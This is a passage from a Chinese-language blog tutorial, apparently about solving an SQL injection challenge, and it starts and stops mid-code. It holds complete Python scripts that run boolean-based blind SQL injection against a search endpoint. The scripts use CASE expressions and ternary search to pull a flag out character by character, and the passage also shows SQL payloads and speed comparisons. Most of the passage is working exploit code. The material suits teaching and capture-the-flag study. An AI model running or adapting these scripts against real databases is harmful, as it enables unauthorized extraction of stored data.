operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      result <span class=\"token operator\">+=</span> char<br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><br>      char_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      char_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><br><br>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br></code></pre>\n<p>簡單來說就是每個字元不斷去試，試到有為止，簡單暴力但有用，跑個三五分鐘大概就能跑出完整的結果，執行過程會像是這樣：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p1.png\" alt=\"\"></p>\n<p>如果像挑戰這樣，我們事先知道 table 名稱跟欄位名稱，頂多執行時間久一點而已，三五分鐘還在可以接受的範圍，但在實際案例中我們可能什麼都不知道，需要去打 information_schema 把各項資訊拿出來，才能把整個資料庫 dump 出來。</p>\n<p>因此，我們需要更有效率的做法。</p>\n<h3 id=\"%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%80%E6%AC%A1%E8%A9%A6%E4%B8%89%E5%80%8B\"><a class=\"direct-link\" href=\"#%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%80%E6%AC%A1%E8%A9%A6%E4%B8%89%E5%80%8B\">#</a> 加速：一次試三個</h3>\n<p>其實仔細觀察可以發現，我們可以控制的回傳結果有四種：</p>\n<ol>\n<li>home1 home2 一起出現（當 tag 是 1）</li>\n<li>只有 home1 出現（當 tag 是 2）</li>\n<li>只有 home2 出現（當 tag 是 5）</li>\n<li>兩個都沒出現（當 tag 是 10）</li>\n</ol>\n<p>而剛剛的攻擊方式，我們只用到了兩個狀況，如果四個都利用的話，速度會變成三倍。</p>\n<p>利用的方式很簡單，就是我們可以從原本一次試一個，變成一次試三個，像是這樣：</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">case</span><br>  <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">\"a%\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">1</span><br>  <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">\"b%\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">2</span><br>  <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">\"c%\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">5</span><br>  <span class=\"token keyword\">else</span> <span class=\"token number\">10</span><br><span class=\"token keyword\">end</span> <span class=\"token keyword\">from</span> flag<span class=\"token punctuation\">)</span></code></pre>\n<p>一個 query 可以試三個字元，速度提升了三倍，腳本如下：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-search-3x.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> datetime<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><span class=\"token keyword\">import</span> time<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">print_success</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[92m</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>raw<span class=\"token punctuation\">}</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>char_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>char_set <span class=\"token operator\">=</span> <span class=\"token string\">'}abcdefghijklmnopqrstuvwxyz_'</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics{'</span><br><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  found <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><br>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>char_set<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    chars <span class=\"token operator\">=</span> char_set<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><br>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span><br>      chars <span class=\"token operator\">+=</span> <span class=\"token string\">'a'</span><br>    payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''<br>    (select case<br>      when (content like \"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>result<span class=\"token operator\">+</span>chars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">%\") then 1  <br>      when (content like \"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>result<span class=\"token operator\">+</span>chars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">%\") then 2  <br>      when (content like \"</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>result<span class=\"token operator\">+</span>chars<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">%\") then 5<br>      else 10<br>     end from flag)<br>    '''</span></span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"trying \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br>    response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/search.php?tag=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>      data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><br>        result<span class=\"token operator\">+=</span>chars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><br>        found <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>      <span class=\"token keyword\">elif</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        <span class=\"token keyword\">continue</span><br>      <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>        found <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>        <span class=\"token keyword\">if</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"home1\"</span><span class=\"token punctuation\">:</span><br>          result<span class=\"token operator\">+=</span>chars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><br>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>          result<span class=\"token operator\">+=</span>chars<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><br><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">break</span><br><br>    <span class=\"token keyword\">if</span> found<span class=\"token punctuation\">:</span><br>      print_success<span class=\"token punctuation\">(</span><span class=\"token string\">\"found: \"</span> <span class=\"token operator\">+</span> result<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">break</span><br><br>  <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> found<span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"end\"</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">break</span><br><br><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"time: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start<span class=\"token punctuation\">}</span></span><span class=\"token string\">s\"</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>跑起來會像這樣：</p>\n<p><img src=\"/img/posts/huli/sql-injection-in-action/p2.png\" alt=\"\"></p>\n<p>跑了大概 90 秒左右得出答案，比原本的快了不少。</p>\n<p>假設 n 是字串長度，而我們的字元集大約 27 個，最差的狀況下，原本需要 27n 次嘗試才能得到 flag，而換成這種方法以後，只要 27n/3 = 9n 次。</p>\n<p>不過這樣還不夠快，既然都可以有三種結果了，那何不如換種方式利用呢？</p>\n<h3 id=\"%E5%86%8D%E6%AC%A1%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%89%E5%88%86%E6%90%9C\"><a class=\"direct-link\" href=\"#%E5%86%8D%E6%AC%A1%E5%8A%A0%E9%80%9F%EF%BC%9A%E4%B8%89%E5%88%86%E6%90%9C\">#</a> 再次加速：三分搜</h3>\n<p>與其三個三個試，不如換成「三組三組」試，例如說原本的字元集是 <code>}abcdefghijklmnopqrstuvwxyz_</code>，分成三等份會變成：</p>\n<ol>\n<li>}abcdefgh</li>\n<li>ijklmnopq</li>\n<li>rstuvwxyz_</li>\n</ol>\n<p>我們去看字元是不是在某個特定組別裡面，SQL query 如下：</p>\n<pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">case</span><br>  <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{}%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{a%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{b%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{c%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{d%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{e%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{f%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{g%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{h%'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">1</span><br>  <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{i%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{j%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{k%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{l%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{m%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{n%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{o%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{p%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{q%'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">2</span><br>  <span class=\"token keyword\">when</span> <span class=\"token punctuation\">(</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{r%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{s%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{t%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{u%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{v%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{w%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{x%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{y%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{z%'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><br>    <span class=\"token punctuation\">(</span>content <span class=\"token operator\">like</span> <span class=\"token string\">'cymetrics{\\_%'</span><span class=\"token punctuation\">)</span><br>  <span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span> <span class=\"token number\">5</span><br>  <span class=\"token keyword\">else</span> <span class=\"token number\">10</span><br><span class=\"token keyword\">end</span> <span class=\"token keyword\">from</span> flag<span class=\"token punctuation\">)</span></code></pre>\n<p>每次都分成三等份搜尋，就變成了三分搜尋法，最壞的狀況下需嘗試的次數從 9n 變成了 3n，腳本如下（三分搜的部分算是亂寫的，不保證沒有 bug）：</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># exploit-search-teanary.py</span><br><span class=\"token keyword\">import</span> requests<br><span class=\"token keyword\">import</span> time<br><span class=\"token keyword\">import</span> json<br><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse<br><br><span class=\"token keyword\">def</span> <span class=\"token function\">print_success</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"\\033[92m</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>raw<span class=\"token punctuation\">}</span></span><span class=\"token string\">\\033[0m\"</span></span><span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>  <span class=\"token keyword\">return</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>raw<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>host <span class=\"token operator\">=</span> <span class=\"token string\">'https://od-php.herokuapp.com/sql'</span><br>char_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>char_set <span class=\"token operator\">=</span> <span class=\"token string\">'}abcdefghijklmnopqrstuvwxyz_'</span><br>result <span class=\"token operator\">=</span> <span class=\"token string\">'cymetrics{'</span><br><br>is_over <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><br>start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span><br>  print_success<span class=\"token punctuation\">(</span><span class=\"token string\">\"result: \"</span> <span class=\"token operator\">+</span> result<span class=\"token punctuation\">)</span><br>  <span class=\"token keyword\">if</span> is_over<span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">break</span><br><br>  found <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><br>  L <span class=\"token operator\">=</span> <span class=\"token number\">0</span><br>  R <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>char_set<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><br>  <span class=\"token keyword\">while</span> L<span class=\"token operator\">&lt;=</span>R<span class=\"token punctuation\">:</span><br>    s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>R<span class=\"token operator\">-</span>L<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">3</span><br>    ML <span class=\"token operator\">=</span> L <span class=\"token operator\">+</span> s<br>    MR <span class=\"token operator\">=</span> L <span class=\"token operator\">+</span> s <span class=\"token operator\">*</span> <span class=\"token number\">2</span><br>    <span class=\"token keyword\">if</span> s <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      MR <span class=\"token operator\">=</span> L <span class=\"token operator\">+</span> <span class=\"token number\">1</span><br><br>    group <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><br>      char_set<span class=\"token punctuation\">[</span>L<span class=\"token punctuation\">:</span>ML<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>      char_set<span class=\"token punctuation\">[</span>ML<span class=\"token punctuation\">:</span>MR<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>      char_set<span class=\"token punctuation\">[</span>MR<span class=\"token punctuation\">:</span>R<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><br>    <span class=\"token punctuation\">]</span><br><br>    conditions <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><br>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        <span class=\"token comment\"># 空的話加上 1=2，一個恆假的條件</span><br>        conditions<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\"1=2\"</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">continue</span><br>      <span class=\"token comment\"># 這邊要對 _ 做處理，加上 /，否則 _ 會配對到任意一個字元</span><br>      arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"(content like '</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>result<span class=\"token punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">92</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> c <span class=\"token keyword\">if</span> c <span class=\"token operator\">==</span> <span class=\"token string\">'_'</span> <span class=\"token keyword\">else</span> c<span class=\"token punctuation\">}</span></span><span class=\"token string\">%')\"</span></span> <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> group<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><br>      conditions<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">\" or \"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>    payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''<br>    (select case<br>      when (</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>conditions<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">) then 1  <br>      when (</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>conditions<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">) then 2  <br>      when (</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>conditions<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">) then 5<br>      else 10<br>    end from flag)<br>    '''</span></span><br><br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"trying\"</span><span class=\"token punctuation\">,</span> group<span class=\"token punctuation\">)</span><br><br>    response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>host<span class=\"token punctuation\">}</span></span><span class=\"token string\">/search.php?tag=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>encode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> response<span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><br>      is_over <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>      <span class=\"token keyword\">break</span><br><br>    data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"end\"</span><span class=\"token punctuation\">)</span><br>      is_over <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span><br>      <span class=\"token keyword\">break</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><br>      R <span class=\"token operator\">=</span> ML<br>      <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span><br>        result <span class=\"token operator\">+=</span> group<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><br>        <span class=\"token keyword\">break</span><br>      <br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>      <span class=\"token keyword\">if</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"home1\"</span><span class=\"token punctuation\">:</span><br>        L <span class=\"token operator\">=</span> ML<br>        R <span class=\"token operator\">=</span> MR<br>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span><br>          result <span class=\"token operator\">+=</span> group<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><br>          <span class=\"token keyword\">break</span><br>      <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>        L <span class=\"token operator\">=</span> MR<br>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>group<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token 